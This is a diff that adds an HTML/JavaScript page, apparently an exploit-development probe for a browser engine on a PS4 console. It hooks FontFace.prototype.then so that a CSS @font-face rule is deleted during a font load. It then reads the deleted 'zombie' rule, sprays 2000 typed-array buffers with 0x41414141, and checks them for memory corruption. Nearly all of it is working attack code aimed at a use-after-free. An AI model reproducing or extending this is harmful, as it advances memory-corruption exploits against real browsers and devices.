@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — Dual object control probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
+#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
+#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
+#log { height: 68vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
+.ok { color: #0f0; }
+.bad { color: #f66; }
+.weird { color: #ff6; }
+#t { font-family: x; font-size: 80px; color: #fff; line-height: 1; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">running...</div>
+<div id="summary">Combines crash trigger + stale zombie + re-insert + spray. ONE session — quit browser after.</div>
+<div id="log"></div>
+<div id="t">AB</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    var summaryEl = document.getElementById('summary');
+    window.ps4log = function (msg, cls) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        if (cls) line.className = cls;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+    window.ps4summary = function (msg) { summaryEl.textContent = msg; };
+})();
+
+var verdict = { pass: 0, fail: 0, weird: 0, lines: [] };
+
+function pass(msg) {
+    verdict.pass++;
+    verdict.lines.push('✓ ' + msg);
+    ps4log('✓ SUCCESS: ' + msg, 'ok');
+}
+function fail(msg) {
+    verdict.fail++;
+    verdict.lines.push('✗ ' + msg);
+    ps4log('✗ FAILED: ' + msg, 'bad');
+}
+function weird(msg) {
+    verdict.weird++;
+    verdict.lines.push('! ' + msg);
+    ps4log('! WEIRD: ' + msg, 'weird');
+}
+
+function snap(view) {
+    var s = '';
+    for (var i = 0; i < 4; i++) s += view[i].toString(16) + ' ';
+    return s;
+}
+
+function spray(n) {
+    var views = [];
+    for (var i = 0; i < n; i++) {
+        var v = new Uint32Array(64);
+        for (var j = 0; j < 4; j++) v[j] = 0x41414141;
+        views.push(v);
+    }
+    return views;
+}
+
+function scanSpray(views, before, label) {
+    var hit = 0;
+    for (var i = 0; i < views.length; i++) {
+        if (before[i] !== snap(views[i])) {
+            hit++;
+            if (hit <= 3) ps4log(label + ' buf[' + i + '] changed');
+        }
+    }
+    if (hit > 0) {
+        weird(label + ' — ' + hit + ' sprayed buffers changed (possible corruption)');
+    } else {
+        pass(label + ' — no spray corruption detected');
+    }
+    return hit;
+}
+
+function dumpFonts(label) {
+    ps4log('--- ' + label + ' fonts.size=' + document.fonts.size + ' status=' + document.fonts.status);
+    var n = 0;
+    document.fonts.forEach(function (f) {
+        ps4log('  [' + n + '] family=' + f.family + ' status=' + f.status);
+        n++;
+    });
+}
+
+function printFinalSummary() {
+    ps4log('========== FINAL SUMMARY ==========');
+    for (var i = 0; i < verdict.lines.length; i++) ps4log(verdict.lines[i]);
+    ps4log('Passed: ' + verdict.pass + '  Failed: ' + verdict.fail + '  Weird: ' + verdict.weird);
+    ps4log('Refresh this page may OOM — use crash.html to test that separately.');
+
+    if (verdict.weird >= 2) {
+        ps4status('interesting — read WEIRD lines', '#ff6');
+        ps4summary('Possible corruption or stale-state — read WEIRD lines in log.');
+    } else if (verdict.pass >= 8) {
+        ps4status('dual-object control probe done', '#0f0');
+        ps4summary('Dual state confirmed. No spray corruption yet — keep pushing.');
+    } else {
+        ps4status('read summary', '#ff0');
+        ps4summary('Mixed result — check FAILED lines.');
+    }
+}
+
+window.onload = function () {
+    ps4log('Phase 3j — dual object control probe (10)');
+    ps4log('UA: ' + navigator.userAgent);
+
+    var sheet = document.getElementById('s').sheet;
+    var staleRule = sheet.cssRules[0];
+    pass('Held stale ref to cssRules[0] before trigger');
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER (full crash recipe)');
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                sheet.deleteRule(0);
+                document.body.offsetTop;
+                document.documentElement.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+
+    setTimeout(function () {
+        if (fired) pass('Full crash trigger fired');
+        else fail('Trigger never fired — quit browser and retry');
+
+        try {
+            if (staleRule.cssText.length > 0) {
+                pass('READ stale zombie after delete (cssText len ' + staleRule.cssText.length + ')');
+            } else fail('Stale cssText empty');
+        } catch (e) {
+            fail('Stale read threw: ' + e);
+        }
+
+        sheet.insertRule(
+            "@font-face { font-family: x; src: local(Helvetica Bold); unicode-range: U+0042; }",
+            0
+        );
+        var newRule = sheet.cssRules[0];
+
+        if (staleRule !== newRule) {
+            pass('Dual object — zombie and live rule are different objects');
+        } else {
+            weird('Zombie and new rule are same object');
+        }
+
+        if (staleRule.cssText.indexOf('nonexistent-font.woff') !== -1) {
+            pass('Zombie still has OLD bad url');
+        }
+
+        dumpFonts('after trigger');
+
+        var preSpray = spray(2000);
+        var preSnaps = [];
+        for (var s = 0; s < preSpray.length; s++) preSnaps.push(snap(preSpray[s]));
+        pass('Sprayed 2000 buffers before stress phase');
+
+        var staleReads = 0;
+        for (var r = 0; r < 50; r++) {
+            if (staleRule.cssText.indexOf('nonexistent') !== -1) staleReads++;
+        }
+        if (staleReads === 50) {
+            pass('50 stale cssText reads while alive — zombie stable');
+        } else {
+            weird('Stale cssText changed during read loop (' + staleReads + '/50)');
+        }
+
+        document.getElementById('t').textContent = 'B';
+        document.body.offsetTop;
+
+        Promise.all([
+            document.fonts.load('1em x', 'B'),
+            document.fonts.load('1em x', 'AB'),
+            A.loaded
+        ]).then(function (results) {
+            ps4log('concurrent load(B) count=' + results[0].length);
+            ps4log('concurrent load(AB) count=' + results[1].length);
+            ps4log('A.loaded resolved, A.status=' + A.status);
+
+            if (results[0].length > 0) pass('load(B) returned faces after dual-object setup');
+            else if (document.fonts.check('1em x', 'B')) {
+                weird('check(B)=true but load(B)=0 — stale lookup bug');
+            } else {
+                fail('load(B) returned 0 and check(B) false');
+            }
+
+            if (results[1].length >= 1) pass('load(AB) returned ' + results[1].length + ' face(s)');
+
+            document.getElementById('t').textContent = 'AB';
+            ps4log('render AB offset=' + document.getElementById('t').offsetWidth);
+
+            scanSpray(preSpray, preSnaps, 'post-stress spray scan');
+            dumpFonts('final');
+            printFinalSummary();
+        }).catch(function (e) {
+            var msg = String(e);
+            if (msg.indexOf('NetworkError') !== -1) {
+                weird('Concurrent load NetworkError: ' + e);
+            } else {
+                fail('Concurrent load threw: ' + e);
+            }
+            scanSpray(preSpray, preSnaps, 'post-error spray scan');
+            printFinalSummary();
+        });
+    }, 600);
+};
+</script>
+</body>
+</html>
